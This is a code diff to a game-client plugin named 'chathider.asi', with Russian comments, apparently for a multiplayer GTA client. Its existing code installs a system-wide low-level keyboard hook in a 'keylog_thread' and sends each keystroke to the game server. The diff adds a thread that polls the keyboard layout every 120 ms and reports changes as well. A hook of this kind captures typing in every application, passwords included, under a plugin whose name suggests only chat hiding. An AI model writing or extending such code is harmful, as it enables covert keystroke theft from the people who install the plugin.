@@ -211,8 +211,10 @@ static void chathider_client_log(const char* location, const char* message, unsi
 /* 1 = шлём raw пакеты (GetPacketID hook на сервере). 0 = только RPC. */
 #define CHATHIDER_SEND_RAW_PACKET 1
 
-/* Текущая раскладка: два байта "RU", "EN" и т.д. -1 = ещё не опрошена */
+/* Текущая раскладка: два байта "RU", "EN" и т.д. 0xFF = ещё не опрошена */
 static unsigned char g_last_layout[2] = { 0xFF, 0xFF };
+static CRITICAL_SECTION g_layout_cs;
+static volatile long g_layout_poll_stop = 0;
 
 static void get_layout_bytes(unsigned char* a, unsigned char* b)
 {
@@ -222,6 +224,33 @@ static void get_layout_bytes(unsigned char* a, unsigned char* b)
     if (lang == 0x0419) { *a = 'R'; *b = 'U'; }
     else if (lang == 0x0409) { *a = 'E'; *b = 'N'; }
     else { *a = 'E'; *b = 'N'; }
+}
+
+static void send_layout_to_server(void* rak, void** vtable, unsigned char layout0, unsigned char layout1);
+
+/* Проверка раскладки и отправка при изменении (вызывается из потока опроса и из хука клавиш). */
+static void check_and_send_layout_if_changed(void)
+{
+    CNetGame* net = RefNetGame();
+    if (!net || net->GetState() != CNetGame::GAME_MODE_CONNECTED)
+        return;
+    void* rak = net->GetRakClient();
+    if (!rak) return;
+
+    unsigned char layout0, layout1;
+    get_layout_bytes(&layout0, &layout1);
+    EnterCriticalSection(&g_layout_cs);
+    int changed = (g_last_layout[0] != layout0 || g_last_layout[1] != layout1);
+    if (changed)
+    {
+        g_last_layout[0] = layout0;
+        g_last_layout[1] = layout1;
+        LeaveCriticalSection(&g_layout_cs);
+        void** vtable = *(void***)rak;
+        send_layout_to_server(rak, vtable, layout0, layout1);
+    }
+    else
+        LeaveCriticalSection(&g_layout_cs);
 }
 
 /* Отправка смены раскладки — отдельный пакет 253 + RPC 222 (по аналогии с ключом). */
@@ -269,18 +298,8 @@ static void send_key_to_server(unsigned int vkCode)
     void** vtable = *(void***)rak;
     unsigned char keyByte = (unsigned char)(vkCode & 0xFF);
 
-    /* Раскладка: при изменении шлём отдельный пакет (253 + RPC 222) по той же схеме, что и ключ */
-    {
-        unsigned char layout0, layout1;
-        get_layout_bytes(&layout0, &layout1);
-        int changed = (g_last_layout[0] != layout0 || g_last_layout[1] != layout1);
-        if (changed)
-        {
-            g_last_layout[0] = layout0;
-            g_last_layout[1] = layout1;
-            send_layout_to_server(rak, vtable, layout0, layout1);
-        }
-    }
+    /* Раскладка: при изменении шлём отдельный пакет (253 + RPC 222) */
+    check_and_send_layout_if_changed();
 
     RakNet::BitStream bsRpc;
     bsRpc.Write(keyByte);
@@ -331,15 +350,37 @@ static LRESULT CALLBACK lowlevel_keyboard_proc(int nCode, WPARAM wParam, LPARAM 
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+/* Поток опроса раскладки: при смене (Alt+Shift / Ctrl+Shift) отправляем пакет сразу, без ожидания следующей клавиши. */
+static DWORD WINAPI layout_poll_thread(LPVOID)
+{
+    while (!InterlockedCompareExchange(&g_layout_poll_stop, 0, 0))
+    {
+        Sleep(120);
+        check_and_send_layout_if_changed();
+    }
+    return 0;
+}
+
+static HANDLE g_layout_poll_handle = NULL;
+
 static DWORD WINAPI keylog_thread(LPVOID)
 {
     if (!g_hKeylogModule)
         g_hKeylogModule = GetModuleHandleA("chathider.asi");
     HHOOK hHook = SetWindowsHookExA(WH_KEYBOARD_LL, lowlevel_keyboard_proc, g_hKeylogModule, 0);
     if (!hHook) return 1;
+    /* Запускаем опрос раскладки, чтобы смена отправлялась при переключении, а не при следующем нажатии */
+    if (!g_layout_poll_handle)
+        g_layout_poll_handle = CreateThread(NULL, 0, layout_poll_thread, NULL, 0, NULL);
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0))
         DispatchMessage(&msg);
+    InterlockedExchange(&g_layout_poll_stop, 1);
+    if (g_layout_poll_handle)
+    {
+        WaitForSingleObject(g_layout_poll_handle, 500);
+        g_layout_poll_handle = NULL;
+    }
     UnhookWindowsHookEx(hHook);
     return 0;
 }
@@ -347,6 +388,7 @@ static DWORD WINAPI keylog_thread(LPVOID)
 static void start_keylog_if_enabled()
 {
 #if CHATHIDER_KEYLOG_ENABLED
+    InitializeCriticalSection(&g_layout_cs);
     CreateThread(NULL, 0, keylog_thread, NULL, 0, NULL);
 #endif
 }
